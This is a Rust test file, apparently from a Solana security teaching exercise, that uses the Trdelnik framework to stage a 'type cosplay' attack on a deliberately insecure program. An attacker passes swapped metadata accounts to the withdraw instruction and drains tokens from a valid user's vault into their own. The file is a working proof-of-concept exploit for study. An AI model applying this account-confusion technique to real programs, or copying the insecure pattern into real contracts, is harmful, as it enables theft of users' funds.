use fehler::throws;
use program_client;
use trdelnik_client::{anyhow::Result, *};
use solana_sdk::system_program;
use type_cosplay_insecure::{Vault, User, TransferMetadata};
use borsh::BorshDeserialize;

// @todo: create and deploy your fixture
#[throws]
#[fixture]
async fn init_fixture() -> Fixture {
    let mut fixture = Fixture::new();
    // @todo: here you can call your <program>::initialize instruction
    fixture.deploy().await?;
    fixture.register_valid_user().await?;
    fixture.client.airdrop(fixture.attacker.pubkey(), 10_000_000_000).await?;

    fixture
}

#[trdelnik_test]
async fn test_insecure(#[future] init_fixture: Result<Fixture>) {
    let fixture = init_fixture.await?;

    // attacker register himself which creates a new user account
    program_client::type_cosplay_insecure_instruction::add_user(
        &fixture.client, 
        fixture.attacker_user_account.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        fixture.attacker.pubkey(),
        system_program::ID,
        [
            fixture.attacker_vault_account.clone(), 
            fixture.attacker_user_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?;

    // by calling withdraw an attacker ensures the creation of a meta account
    program_client::type_cosplay_insecure_instruction::withdraw(
        &fixture.client,
        1,
        fixture.hack_meta_account.pubkey(),
        fixture.attacker_user_account.pubkey(),
        fixture.attacker.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        fixture.valid_user_vault_account.pubkey(),
        system_program::ID,
        [
            fixture.hack_meta_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?.print();

    let attacker_vault_account = fixture.client.get_account(fixture.attacker_vault_account.pubkey()).await?.unwrap();
    let attacker_vault = Vault::try_from_slice(&attacker_vault_account.data[..]).unwrap();
    println!("Attacker's balance after withdraw is {} tokens", attacker_vault.balance);

    let user_vault_account = fixture.client.get_account(fixture.valid_user_vault_account.pubkey()).await?.unwrap();
    let user_vault = Vault::try_from_slice(&user_vault_account.data[..]).unwrap();
    println!("User's balance after withdraw is {} tokens", user_vault.balance);

    // type cosplay ATTACK
    program_client::type_cosplay_insecure_instruction::withdraw(
        &fixture.client,
        11,
        fixture.valid_meta_account.pubkey(),
        fixture.hack_meta_account.pubkey(),
        fixture.attacker.pubkey(),
        fixture.valid_user_vault_account.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        system_program::ID,
        [
            fixture.valid_meta_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?.print();

    let attacker_vault_account = fixture.client.get_account(fixture.attacker_vault_account.pubkey()).await?.unwrap();
    let attacker_vault = Vault::try_from_slice(&attacker_vault_account.data[..]).unwrap();
    println!("Attacker's balance after withdraw is {} tokens", attacker_vault.balance);

    let user_vault_account = fixture.client.get_account(fixture.valid_user_vault_account.pubkey()).await?.unwrap();
    let user_vault = Vault::try_from_slice(&user_vault_account.data[..]).unwrap();
    println!("User's balance after withdraw is {} tokens", user_vault.balance);

}

struct Fixture {
    client: Client,
    valid_user: Keypair,
    valid_user_vault_account: Keypair,
    valid_user_user_account: Keypair,
    attacker: Keypair,
    attacker_vault_account: Keypair,
    attacker_user_account: Keypair,
    hack_meta_account: Keypair,
    valid_meta_account: Keypair,
}
impl Fixture {
    fn new() -> Self {
        Fixture {
            client: Client::new(system_keypair(0)),
            valid_user: system_keypair(3),
            valid_user_vault_account: keypair(30),
            valid_user_user_account: keypair(31),
            attacker: system_keypair(5),
            attacker_vault_account: keypair(51),
            attacker_user_account: keypair(50),
            hack_meta_account: keypair(98),
            valid_meta_account: keypair(99),
        }
    }

    #[throws]
    async fn deploy(&mut self) {
        self.client
            .airdrop(self.client.payer().pubkey(), 5_000_000_000)
            .await?;

        self.client
            .deploy_by_name(&program_keypair(0), "type_cosplay_insecure")
            .await?;

        self.client
            .deploy_by_name(&program_keypair(8), "type_cosplay_secure")
            .await?;
    }

    #[throws]
    async fn register_valid_user(&self) {
        self.client.airdrop(self.valid_user.pubkey(), 10_000_000_000).await?;
        program_client::type_cosplay_insecure_instruction::add_user(
            &self.client, 
            self.valid_user_user_account.pubkey(),
            self.valid_user_vault_account.pubkey(),
            self.valid_user.pubkey(),
            system_program::ID,
            [
                self.valid_user_vault_account.clone(), 
                self.valid_user_user_account.clone(), 
                self.valid_user.clone()
            ]
        ).await?;
    }
}
